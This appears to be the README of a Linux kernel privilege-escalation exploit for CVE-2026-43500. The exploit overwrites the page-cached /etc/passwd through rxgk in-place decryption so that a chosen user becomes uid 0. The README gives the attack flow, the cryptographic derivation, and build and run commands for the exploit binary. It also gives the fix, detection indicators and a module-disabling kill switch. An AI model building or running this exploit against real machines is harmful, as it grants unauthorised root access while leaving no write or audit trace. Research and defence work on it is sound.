# copy-fail-3-rxgk

CVE-2026-43500. page-cache write primitive via rxgk in-place decrypt.

writeup: [afflicted.sh/blog/posts/copy-fail-3-rxgk.html](https://afflicted.sh/blog/posts/copy-fail-3-rxgk.html)

## what

splice a page from `/etc/passwd` into a pipe, splice the pipe into a UDP socket routed to localhost AF_RXRPC. kernel receives the packet, rxgk decrypts in-place — your plaintext lands in the page cache. no `write(2)`, no mtime, no audit trail. `su` resolves uid 0 from a file nobody wrote to.

dirty pipe's cousin. same bug class (splice maps read-only file pages without CoW), different trigger (rxgk AEAD decrypts before auth check completes, writing into the page-cache-backed skbuff).

builds on V4bel's Dirty Frag work on rxkad. rxkad has 56-bit DES — brute-forceable. rxgk has AES-128 — not brute-forceable. so we don't search the key, we derive it (we injected K0 via `add_key(2)`, we MITM the handshake, we know every derivation input) and solve the CTS-CBC chain algebraically instead.

## how it flows

```
you             kernel          page cache
 |                |                |
 |--add_key(K0)-->|                |
 |--AF_RXRPC----->|                |
 |  (MITM the     |                |
 |   handshake,   |                |
 |   learn epoch, |                |
 |   cid, etc)    |                |
 |                |                |
 |--derive Ke---->|                |
 |  (same KDF     |                |
 |   chain the    |                |
 |   kernel uses) |                |
 |                |                |
 |--vmsplice:     |                |
 |  crafted ct    |                |
 |--splice:       |                |
 |  /etc/passwd   |----page ref--->|
 |--splice→sock-->|                |
 |                |--decrypt------>| "x:0000:0000:"
 |                |  in-place      | overwrites uid:gid
 |                |                |
 |  su user → root                 |
```

## the crypto trick

we control Ke. CTS-CBC with 3 blocks, IV=0:
```
ct = X0 || X2 || X1[0..11]    (CTS swaps last two)
```

constraint: `ct[32..43]` must equal current file bytes (that's what splice maps in), decrypted `pt[32..43]` must be `"x:0000:0000:"`.

set `pt[0..15] = 0`, `X1[12..15] = 0`. X1[0..11] = current file bytes. solve backwards for pt[16..31]. four AES operations total. one packet, one flip.

## the KDF

userspace reimplementation of the kernel's RFC 3961 chain: nfold → DK → PRF → PRF+ → TK → Ke. got it wrong three times — counter is 4-byte BE not 1-byte, PRF truncation zeroes low bits, usage constants are 5 bytes after concat. `kdf-oracle/` is a kernel module that validates your userspace KDF against `crypto_krb5_calc_PRFplus`. loads, prints, returns -EINVAL to auto-unload.

## build

```
gcc -O2 -Wall stage5e_passwd_flip.c krb5kdf.c -lcrypto -o stage5e
```

needs `libssl-dev` / `openssl-devel`.

```
cd kdf-oracle && make
sudo insmod krb5kdf_oracle.ko   # prints TK to dmesg, auto-unloads
```

## run

```
./stage5e              # flips user "np" to uid=0/gid=0
./stage5e alice        # flips alice
./stage5e alice "x:1000:1000:"   # restore (12 bytes exact)
```

`recvmsg: Bad message` is expected — that's the kernel rejecting the AEAD auth check. by then the page cache is already written.

## needs

- `CONFIG_AF_RXRPC`, `CONFIG_RXGK`, `CONFIG_CRYPTO_KRB5`
- `add_key(2)` access (session keyring)
- unpatched kernel (pre-CVE-2026-43500 fix)

## files

```
krb5kdf.c              RFC 3961 KDF chain (nfold, DK, PRF, PRF+, TK, Ke)
krb5kdf.h              header
stage5e_passwd_flip.c  the exploit
kdf-oracle/            kernel module — KDF oracle for validation
```

## the patch

V4bel's fix in `net/rxrpc/call_event.c` — one predicate added to the shared dispatcher:

```diff
 if (sp->hdr.type == RXRPC_PACKET_TYPE_DATA &&
     sp->hdr.securityIndex != 0 &&
-    skb_cloned(skb)) {
+    (skb_cloned(skb) || skb->data_len)) {
```

forces linearization of fragmented skbuffs before in-place crypto. closes both rxkad and rxgk vectors.

## detection

- `rxrpc` keys in session keyrings (`keyctl show`)
- AF_RXRPC (family 33) sockets on loopback
- page-cache vs disk mismatch (`echo 3 > /proc/sys/vm/drop_caches` then diff `/etc/passwd`)

## kill switch

```
echo "install af_rxrpc /bin/false" > /etc/modprobe.d/no-rxrpc.conf
```

most boxes don't need AFS.

## see also

- [CVE-2022-0847 (Dirty Pipe)](https://dirtypipe.cm4all.com/)
- [RFC 3961](https://datatracker.ietf.org/doc/html/rfc3961), [RFC 4402](https://datatracker.ietf.org/doc/html/rfc4402), [draft-wilkinson-afs3-rxgk](https://datatracker.ietf.org/doc/html/draft-wilkinson-afs3-rxgk)
